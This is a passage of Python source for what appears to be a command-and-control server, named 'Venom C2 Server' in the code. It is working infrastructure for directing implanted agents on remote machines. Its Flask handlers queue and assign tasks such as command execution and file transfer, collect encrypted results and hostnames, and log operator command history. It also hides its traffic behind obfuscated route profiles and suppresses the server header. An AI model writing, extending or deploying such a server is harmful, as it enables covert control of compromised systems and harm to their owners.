            'agent_id': agent_id,
            'message': 'Agent registered successfully'
        }
        return jsonify(encrypt_response_data(response_data))
        
    except Exception as e:
        logger.error(f"Agent registration failed: {e}")
        return jsonify({'error': 'Registration failed'}), 500

def agent_poll():
    """Poll for available tasks"""
    try:
        # Decrypt the request data first
        data = decrypt_request_data(request)
        if not data:
            return jsonify({'error': 'Invalid request data'}), 400
        
        agent_id = data.get('agent_id')
        if not agent_id:
            return jsonify({'error': 'Agent ID required'}), 400
        
        # Update agent last seen time
        connected_agents[agent_id] = time.time()
        
        # Find pending tasks for this agent or any agent
        available_task = None
        for task_id in task_queue:
            task = tasks.get(task_id)
            if task and task.status == "pending":
                if task.agent_id is None or task.agent_id == agent_id:
                    available_task = task
                    task_queue.remove(task_id)
                    task.status = "assigned"
                    task.assigned_to = agent_id
                    break
        
        if available_task:
            logger.info(f"Assigned task {available_task.id} to agent {agent_id}")
            response_data = {
                'has_task': True,
                'task': available_task.to_dict()
            }
        else:
            response_data = {'has_task': False}
        
        return jsonify(encrypt_response_data(response_data))
        
    except Exception as e:
        logger.error(f"Agent poll failed: {e}")
        return jsonify({'error': 'Polling failed'}), 500

def submit_result():
    """Submit task result"""
    try:
        # Decrypt the request data first
        data = decrypt_request_data(request)
        if not data:
            return jsonify({'error': 'Invalid request data'}), 400
        
        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        result = data.get('result', '')
        success = data.get('success', False)
        
        if not task_id:
            return jsonify({'error': 'Task ID required'}), 400
        
        # Update task status
        task = tasks.get(task_id)
        if task:
            task.status = "completed" if success else "failed"
            agent_results[task_id] = {
                'result': result,
                'success': success,
                'agent_id': agent_id,
                'completed_at': datetime.now().isoformat()
            }
            
            # Track agent sleep times for sleep tasks
            if task.type == 'sleep' and success and task.sleep_time:
                current_time = time.time()
                sleep_time = float(task.sleep_time)
                
                if agent_id not in agent_sleep_times:
                    agent_sleep_times[agent_id] = {'max_sleep': sleep_time, 'last_updated': current_time}
                else:
                    # Update max sleep time if this sleep was longer
                    if sleep_time > agent_sleep_times[agent_id]['max_sleep']:
                        agent_sleep_times[agent_id]['max_sleep'] = sleep_time
                    agent_sleep_times[agent_id]['last_updated'] = current_time
                
                logger.info(f"Updated sleep time for agent {agent_id}: max={sleep_time}s")
            
            logger.info(f"Received result for task {task_id} from agent {agent_id}")

            # Append command history (record operator username if available)
            try:
                hostname = agent_system_info.get(agent_id, {}).get('hostname', 'unknown')
                command_str = format_task_command(task)
                entry = {
                    'timestamp': datetime.now().isoformat(),
                    'agent_id': agent_id,
                    'hostname': hostname,
                    'operator': getattr(g, 'auth_user', None),
                    'command': command_str,
                    'type': task.type,
                    'stdout': (result or {}).get('stdout', ''),
                    'stderr': (result or {}).get('stderr', '')
                }
                append_history_entry(hostname, entry)
            except Exception as e:
                logger.error(f"Failed to log history: {e}")
        
        response_data = {'success': True, 'message': 'Result received'}
        return jsonify(encrypt_response_data(response_data))
        
    except Exception as e:
        logger.error(f"Result submission failed: {e}")
        return jsonify({'error': 'Result submission failed'}), 500

def create_task():
    """Endpoint for clients to create new tasks"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'Request data required'}), 400
            
        task_type = data.get('type')
        
        if not task_type:
            return jsonify({'error': 'Task type required'}), 400
        
        task = Task(
            task_type=task_type,
            command=data.get('command'),
            sleep_time=data.get('sleep_time'),
            jitter_percent=data.get('jitter_percent'),
            agent_id=data.get('agent_id'),
            path=data.get('path'),
            src=data.get('src'),
            dst=data.get('dst'),
            content=data.get('content'),
            key_path=data.get('key_path'),
            port=data.get('port'),
            user=data.get('user'),
            domain=data.get('domain'),
            local_path=data.get('local_path'),
            remote_path=data.get('remote_path'),
            file_data=data.get('file_data'),
            mode=data.get('mode')
        )
        
        tasks[task.id] = task
        task_queue.append(task.id)
        
        logger.info(f"Created new task {task.id} of type {task_type}")
        
        return {
            'success': True,
            'task_id': task.id,
            'message': 'Task created successfully'
        }
        
    except Exception as e:
        logger.error(f"Task creation failed: {e}")
        return jsonify({'error': 'Task creation failed'}), 500

def list_tasks():
    """List all tasks and their status"""
    try:
        task_list = []
        for task_id, task in tasks.items():
            task_data = task.to_dict()
            if task_id in agent_results:
                task_data['result'] = agent_results[task_id]
            task_list.append(task_data)
        
        return {
            'success': True,
            'tasks': task_list,
            'total_tasks': len(task_list)
        }
        
    except Exception as e:
        logger.error(f"Task listing failed: {e}")
        return jsonify({'error': 'Task listing failed'}), 500

def get_task_result(task_id):
    """Get specific task result"""
    try:
        task = tasks.get(task_id)
        if not task:
            return jsonify({'error': 'Task not found'}), 404
        
        task_data = task.to_dict()
        if task_id in agent_results:
            task_data['result'] = agent_results[task_id]
        
        return {
            'success': True,
            'task': task_data
        }
        
    except Exception as e:
        logger.error(f"Task retrieval failed: {e}")
        return jsonify({'error': 'Task retrieval failed'}), 500

def agent_checkin():
    """Agent checkin endpoint with system information"""
    try:
        data = decrypt_request_data(request)
        if not data:
            return jsonify({'error': 'Invalid request data'}), 400
        
        agent_id = data.get('agent_id')
        system_info = data.get('system_info')  # Now optional
        
        if not agent_id:
            return jsonify({'error': 'Agent ID required'}), 400
        
        # Update connected agents and system info
        current_time = time.time()
        connected_agents[agent_id] = current_time
        if system_info:
            agent_system_info[agent_id] = system_info
        
        # Initialize sleep time tracking from poll_interval if not already tracked
        if system_info:
            poll_interval = system_info.get('poll_interval')
            if poll_interval and agent_id not in agent_sleep_times:
                agent_sleep_times[agent_id] = {
                    'max_sleep': float(poll_interval),
                    'last_updated': current_time
                }
                logger.info(f"Initialized sleep tracking for agent {agent_id}: poll_interval={poll_interval}s")
        
        # Save checkin data to file
        if system_info:
            save_checkin_data(agent_id, system_info)
        
        logger.info(f"Agent {agent_id} checked in from {system_info.get('hostname', 'unknown')}")
        
        response_data = {
            'success': True,
            'message': 'Checkin successful',
            'agent_id': agent_id,
            'server_time': datetime.now().isoformat()
        }
        
        return jsonify(encrypt_response_data(response_data))
        
    except Exception as e:
        logger.error(f"Agent checkin failed: {e}")
        return jsonify({'error': 'Checkin failed'}), 500

def list_agents():
    """List all connected agents and their information"""
    try:
        current_time = time.time()
        agents_list = []
        
        for agent_id, last_seen in connected_agents.items():
            # Determine agent status based on sleep time tracking
            is_online = True
            timeout_seconds = 300  # Default 5 minutes for agents without sleep tracking
            
            # Check if we have sleep time data for this agent
            if agent_id in agent_sleep_times:
                max_sleep = agent_sleep_times[agent_id]['max_sleep']
                # Agent is considered inactive if not seen for 2x their max sleep time
                timeout_seconds = max_sleep * 2
                
            time_since_last_seen = current_time - last_seen
            is_online = time_since_last_seen < timeout_seconds
            
            agent_info = {
                'agent_id': agent_id,
                'last_seen': datetime.fromtimestamp(last_seen).isoformat(),
                'is_online': is_online,
                'system_info': agent_system_info.get(agent_id, {}),
                'max_sleep_time': agent_sleep_times.get(agent_id, {}).get('max_sleep'),
                'timeout_seconds': timeout_seconds
            }
            agents_list.append(agent_info)
        
        # Sort by last seen (most recent first)
        agents_list.sort(key=lambda x: x['last_seen'], reverse=True)
        
        return {
            'success': True,
            'agents': agents_list,
            'total_agents': len(agents_list),
            'online_agents': len([a for a in agents_list if a['is_online']])
        }
        
    except Exception as e:
        logger.error(f"Agent listing failed: {e}")
        return jsonify({'error': 'Agent listing failed'}), 500

def cleanup_old_data():
    """Background task to cleanup old data"""
    while True:
        try:
            current_time = time.time()
            
            # Remove agents based on sleep-aware timeouts or default 1 hour
            old_agents = []
            for agent_id, last_seen in connected_agents.items():
                timeout_seconds = 3600  # Default 1 hour
                
                # Use 4x max sleep time for cleanup (more conservative than 2x for status)
                if agent_id in agent_sleep_times:
                    max_sleep = agent_sleep_times[agent_id]['max_sleep']
                    timeout_seconds = max(max_sleep * 4, 3600)  # At least 1 hour
                
                if current_time - last_seen > timeout_seconds:
                    old_agents.append(agent_id)
            
            for agent_id in old_agents:
                del connected_agents[agent_id]
                # Also clean up sleep time tracking
                if agent_id in agent_sleep_times:
                    del agent_sleep_times[agent_id]
                logger.info(f"Removed inactive agent {agent_id}")
            
            time.sleep(300)  # Run every 5 minutes
        except Exception as e:
            logger.error(f"Cleanup task failed: {e}")
            time.sleep(60)

def load_agent_system_info():
    """Load agent system info from checkins.json on server startup"""
    try:
        checkin_file = 'checkins.json'
        if not os.path.exists(checkin_file):
            logger.info("No checkins.json file found, starting with empty system info")
            return
        
        with open(checkin_file, 'r') as f:
            checkins = json.load(f)
        
        # Load the most recent system info for each agent
        agent_latest_info = {}
        for checkin in checkins:
            agent_id = checkin.get('agent_id')
            system_info = checkin.get('system_info', {})
            timestamp = checkin.get('timestamp')
            
            if agent_id and system_info:
                # Keep only the latest system info for each agent
                if agent_id not in agent_latest_info or timestamp > agent_latest_info[agent_id]['timestamp']:
                    agent_latest_info[agent_id] = {
                        'system_info': system_info,
                        'timestamp': timestamp
                    }
        
        # Load into global agent_system_info
        for agent_id, info in agent_latest_info.items():
            agent_system_info[agent_id] = info['system_info']
        
        logger.info(f"Loaded system info for {len(agent_latest_info)} agents from checkins.json")
        
    except Exception as e:
        logger.error(f"Failed to load agent system info: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Venom C2 Server')
    parser.add_argument('--adduser', nargs=2, metavar=('USERNAME', 'PASSWORD'), help='Add or update an admin user')
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', type=int, default=5000)
    args = parser.parse_args()

    if args.adduser:
        username, password = args.adduser
        try:
            add_or_update_user(username, password)
            print(f"User '{username}' added/updated")
            sys.exit(0)
        except Exception as e:
            print(f"Failed to add user: {e}")
            sys.exit(1)

    first_password = ensure_default_admin()

    # Load agent system info from previous checkins
    load_agent_system_info()
    
    # Start profiles watcher background task
    watcher_thread = threading.Thread(target=watch_profiles_for_changes, args=(app, 30), daemon=True)
    watcher_thread.start()
    
    # Start cleanup background task
    cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
    cleanup_thread.start()
    
    # Print startup info
    print(f"Server starting on {args.host}:{args.port}...")
    print("=" * 50)
    
    # Register all routes using profiles if present (fallback to defaults)
    register_obfuscated_routes(app)
    # Print default admin credentials at the end of startup (only on first run), with color
    if first_password:
        GREEN = "\033[92m"
        BOLD = "\033[1m"
        RESET = "\033[0m"
        banner = "=" * 50
        print(f"{GREEN}{BOLD}{banner}{RESET}")
        print(f"{GREEN}{BOLD}Default admin credentials (store securely):{RESET}")
        print(f"{GREEN}{BOLD}  username: admin{RESET}")
        print(f"{GREEN}{BOLD}  password: {first_password}{RESET}")
        print(f"{GREEN}{BOLD}{banner}{RESET}")
    
    # Run server
    app.run(host=args.host, port=args.port, debug=False, request_handler=NoServerHeaderWSGIRequestHandler)